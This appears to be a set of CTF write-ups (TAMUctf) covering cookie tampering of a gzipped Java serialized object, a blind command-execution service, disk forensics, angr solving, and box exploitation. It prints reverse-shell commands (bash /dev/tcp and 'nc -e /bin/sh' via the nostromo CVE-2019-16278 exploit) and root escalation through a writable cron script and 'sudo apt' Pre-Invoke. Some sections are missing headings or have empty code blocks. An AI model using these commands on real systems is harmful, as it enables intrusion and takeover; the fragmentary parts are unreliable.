# Web

## Too many credits 1

> Okay, fine, there's a lot of credit systems. We had to put that guy on break; seriously concerned about that dude.
> Anywho. We've made an actually secure one now, with Java, not dirty JS this time. Give it a whack?
> If you get two thousand million credits again, well, we'll just have to shut this program down.

The page shows us a counter of credits and lets us increment it by one clicking on a button.

Counter state is saved in a cookie named `counter=H4sIAAA.../.../...A==`.

The first fours characters of every cookie, `H4sI`, points to gzip compressed data.

Decompressing the cookie gets access to a plain text serialization of the Java Class.

Only need to modify the value and compress it back.

```python
import gzip
import base64
import zlib

gzip.decompress(base64.b64decode("H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAABwAU254bUgAAAA=="))
# b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\x00\x00\x00\x08'

moreCredits = b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\xFF\xFF\xFF\xFF'
base64.b64encode(gzip.compress(moreCredits))
# b'H4sIAKpBdl4C/1vzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMADBfyAAAMVz/stSAAAA'
```

Changing the cookie in the browser, the counter shows more that 2000M credits and the flag.

Extract the image from the .xz archive, then simply grep from strings.

```bash
xzdec -d WindowsXP.img.xz | strings | grep "gigem{"
```

## blind

> nc challenges.tamuctf.com 3424

After connecting to the socket, writing something returns a number.
From the numbers (0-OK, 1-ERR, 127-NOT_FOUND) we can guess it executes the command within a shell and retuns the status code.

First, set up a listener `nc -lvp 1337`.

`nc` isn't installed on the server since it returns the status code 127, but we can also open a reverse shell with:

```bash
/bin/bash -i > /dev/tcp/<our ip>/1337 0<&1 2>&1
```

üèÅ __gigem{r3v3r53_5h3ll5}__{:.spoiler}

### Alternative method

In case the reverse shell didn't work, one could have bruteforced every char using ifs.

```python
from pwn import *
import string

conn = remote('challenges.tamuctf.com', 3424)

fmt = '[ $(head flag.txt -c {}) == "{}" ]'
chars = 6
flag = "gigem{"

while True:
    chars += 1
    for c in string.ascii_lowercase + string.digits + string.ascii_uppercase + '_}{':
        print flag+c
        conn.sendline(str.format(fmt, chars, flag+c))
        status = conn.recvline()

        if "0" in status:
            flag += c
            print flag
            if c == "}":
                exit()
            break
```

## corrupted disk

> We've recovered this disk image but it seems to be damaged. Can you recover any useful information from it?

Extract all files from `recovered_disk.img`.

```
binwalk --dd=".*" recovered_disk.img
```

There's one image that has the flag in plain text.

Convert numbers to [IEEE754](https://www.h-schmidt.net/FloatConverter/IEEE754.html) 32 bits floating point.

(-70.249, -18.529)

The coordinates put in google maps take us to Chile, where in the fields theres a logo of the Coca Cola brand.

Reading the header at the beginning of the file, we can find the word `Exif`.

This means the photo is a .jpeg not a .png.

Changing the .png signature with a .jpeg one reveals us the photo with flag.

# Rev

## angrmanagement

> nc rev.tamuctf.com 4322

The binary given does a lot of checks agains the input and if they all evaluate to true, it prints the flag.

Angr can be used to try and evaluate the input using Symbolic Execution.

```python
import angr
import claripy

p = angr.Project('./angrmanagement', auto_load_libs=False)

flag = claripy.BVS('flag', 32*8) # 32 is an initial guess
initial_state = p.factory.entry_state(args=['./angrmanagement'], stdin=flag)

# limits the range of characters to use
for b in flag.chop(8):
    initial_state.add_constraints(claripy.Or(b == 0x0, claripy.And(b >= 0x21, b <= 0x7e)))

sm = p.factory.simulation_manager(initial_state)
destinationAddr = 0x402345 # addr of printf("flag: ...")
sm.explore(find=destinationAddr)

if len(sm.found) > 0:
    s = sm.found[0]
    print("flag: ", s.solver.eval(flag, cast_to=bytes).split(b'\0')[0].decode("ascii"))
```

This was more of a riddle.

You had to find out that each char was converted to int and added together with the previous.

The result of each increment was then printed without spaces.

i.e.
```103 208 311 412 ... = 103 + 105 + 103 + 101 + ... = gige...```

## My first blog

There's only one host, and it only has port 80 open.

Browsing an error page shows us that the webserver runs on nostromo 1.9.6 which is vulnerable to RCE [[CVE-2019-16278](https://www.exploit-db.com/exploits/47837)].

The vulnerability can be exploited using the python script form `exploit-db` or the module `exploit/multi/http/nostromo_code_exec` in metasploit.

```bash
python2 exploit.py 172.30.0.2 80 'nc -e "/bin/sh" 172.30.0.14 12345'
```

`ps aux` shows that there's `/tmp/start.sh` that's run by root. It's used to run `nhttpd` and `cron`.

In `/etc/crontab` there's a user defined entry

```text
* * * * * root /usr/bin/healthcheck
```

`healthcheck` is owned by root but has 777 permission.

Add `cat /root/flag.txt > /tmp/flag.txt` at the end, et voila!

Server has port 4321 open.

Reading challenge description, we can assume that there's a nc session that pipes into vim.

Searching for vim vulnerabilites, lead us to a pretty version-specific vulnerability [CVE-2019-12735](https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md)

```

```

It was the right one and it successfully popped a shell.

```

```

## Obituary_2

> This is a continue of Obituary_1. Root is now required to read 2nd flag

In the home directory there's `note_to_self.txt` which covers the vim vulnerability and reports that `apt` is set as NOPASSWD in sudoers.

Let's get a shell using `apt Pre-Invoke` option to execute commands.

```bash
$ sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
...
$ whoami
root
$ cat /root/flag.txt
gigem{...}

This was a basic `printf` format exploitation

use "%lx %lx %lx %lx ..." to extract the content of the stack where there flag was previously read with fgets().

Inverted order of bytes which are read in little endian and convert to string.

Export the number generator from the decompiled c code from ghidra and compile it on its own.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

void main() {
  srand((uint)time((time_t *)0x0));

  for (int i = 0; i < 100; i++) {
    printf("%d\n", (rand() % 100000 + 1));
  }
}
```

Execute the `nc` command at the same time of the extracted number generator.

```bash
./num_gen | nc <ip> <port>
```
